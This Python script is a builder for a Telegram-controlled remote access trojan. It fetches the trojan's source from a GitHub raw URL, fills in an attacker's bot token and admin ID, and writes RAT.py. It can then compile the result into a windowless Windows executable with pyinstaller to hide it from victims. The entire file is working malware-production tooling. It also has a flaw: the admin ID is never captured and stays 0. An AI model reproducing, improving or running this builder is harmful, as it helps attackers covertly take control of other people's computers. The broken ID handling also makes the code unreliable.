# Telegram-RAT Builder by AndrijReally(https://github.com/AndrijReally)
# Telegram-RAT by Bainky(https://github.com/Bainky/Telegram-RAT/commits?author=Bainky)
import telebot
from colorama import Fore, init
from subprocess import DEVNULL, STDOUT, check_call
import requests
import time
import random
import sys
import os
import shutil
import time
init()


def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')


def logo():
    print(Fore.YELLOW + '''     ____  ___  ______   ____        _ __    __
    / __ \\/   |/_  __/  / __ )__  __(_) /___/ /__  _____
   / /_/ / /| | / /    / __  / / / / / / __  / _ \\/ ___/
  / _, _/ ___ |/ /    / /_/ / /_/ / / / /_/ /  __/ /
 /_/ |_/_/  |_/_/    /_____/\\__,_/_/_/\\__,_/\\___/_/''')


def build():
    clear()
    logo()

    print(Fore.YELLOW)
    print(' Get source code...')

    try:
        r = requests.get('https://raw.githubusercontent.com/Bainky/Telegram-RAT/master/RAT.py')
        time.sleep(.2)
        source_code = r.text
    except KeyboardInterrupt:
        print(Fore.RED + ' ...ERROR (KeyboardInterrupt)')
        sys.exit()
    except Exception as ex1:
        print(Fore.RED + ' ...ERROR' + str(ex1))
        sys.exit()
    else:
        print(Fore.GREEN + ' ...OK')

    token = ['null']
    for i in range(0, 100):
        print(Fore.YELLOW)
        print(Fore.YELLOW + ' Get bot token...' + Fore.CYAN)

        try:
            token[0] = input(' > ')
        except KeyboardInterrupt:
            print(Fore.RED + '\n ...ERROR (KeyboardInterrupt)')
            sys.exit()
        except Exception as ex2:
            print(Fore.RED + ' ...ERROR' + str(ex2))
            sys.exit()
        else:
            if len(token[0]) != 46:
                print(Fore.RED + ' ...ERROR (NotATelegramToken)')
            else:
                print(Fore.GREEN + ' ...OK\n')
                break

    print(Fore.YELLOW + ' Get admin id...' + Fore.CYAN)

    try:
        admin_id = [0]
        print(' Send \'/get_id\' command to your bot.')
        bot = telebot.TeleBot(token[0])
        done = [False]

        @bot.message_handler(commands=['get_id'])
        def get_id(message):
            if done[0] is not True:
                msg = bot.send_message(message.chat.id, 'Wait...')
                time.sleep(float('.' + str(random.randint(1, 3))))
                bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text='Wait...\n...OK')
                bot.stop_polling()
                print(Fore.GREEN + ' ...OK\n')
                print(Fore.YELLOW + ' Generating RAT...' + Fore.CYAN)
                done[0] = True

        bot.polling(1)
    except KeyboardInterrupt:
        print(Fore.RED + ' ...ERROR (KeyboardInterrupt)')
        sys.exit()
    except Exception as ex3:
        print(Fore.RED + ' ...ERROR' + str(ex3))
        sys.exit()

    try:
        source_code = source_code.replace('Токен', token[0])
        source_code = source_code.replace('Айди', str(admin_id[0]))
        with open('temp.py', 'w', encoding='utf-8') as f:
            f.write(str(source_code))

        with open('temp.py', 'r', encoding='utf-8') as f:
            lines = f.readlines()

        with open('RAT.py', 'w', encoding='utf-8') as f:
            digit = [0]
            for i in lines:
                if digit[0] == 1 and i == '\n':
                    digit[0] = 0
                else:
                    f.write(str(i))
                    digit[0] += 1

        os.remove('temp.py')
    except KeyboardInterrupt:
        print(Fore.RED + ' ...ERROR (KeyboardInterrupt)')
        sys.exit()
    except Exception as ex4:
        print(Fore.RED + ' ...ERROR' + str(ex4))
        sys.exit()
    else:
        print(Fore.GREEN + ' ...OK\n')

    print(Fore.YELLOW + ' Done.')
    print(Fore.YELLOW + ' Press any key to return to main menu.', end='')
    input()


def convert2exe():
    clear()
    logo()

    if os.path.isfile('RAT.exe'):
        os.remove('RAT.exe')

    print(Fore.YELLOW)
    print(' Converting to EXE...' + Fore.CYAN)

    try:
        check_call(['pyinstaller', '-F', '--workpath=.\\builds\\build', '--distpath=.\\builds\\dist',
                    '--specpath=.\\builds', '--noconsole', '--clean', 'RAT.py'],
                   stdout=DEVNULL, stderr=STDOUT)
        exe_file = []
        for i in os.listdir(os.path.join(os.getcwd(), 'builds\\dist')):
            if i.endswith('.exe'):
                exe_file.append(i)
        for j in exe_file:
            shutil.copy2(os.path.join(os.getcwd(), ('builds\\dist\\' + j)), os.getcwd())

        shutil.rmtree(os.path.join(os.getcwd(), '__pycache__'))
        shutil.rmtree(os.path.join(os.getcwd(), 'builds'))
    except KeyboardInterrupt:
        print(Fore.RED + ' ...ERROR (KeyboardInterrupt)')
        sys.exit()
    except Exception as ex5:
        print(Fore.RED + ' ...ERROR' + str(ex5))
        sys.exit()
    else:
        print(Fore.GREEN + ' ...OK\n')

    print(Fore.YELLOW + ' Done.')
    print(Fore.YELLOW + ' Press any key to return to main menu.', end='')
    input()


while True:
    try:
        clear()
        logo()

        print(Fore.YELLOW)
        print(' 1-Build RAT')
        print(' 2-Convert to EXE' + Fore.CYAN)
        input_ = input(' > ')
        if input_ == '1':
            build()
        elif input_ == '2':
            convert2exe()
    except KeyboardInterrupt:
        print(Fore.RED + '\n ...ERROR (KeyboardInterrupt)')
        sys.exit()
    except Exception as ex:
        print(Fore.RED + ' ...ERROR' + str(ex))
        sys.exit()
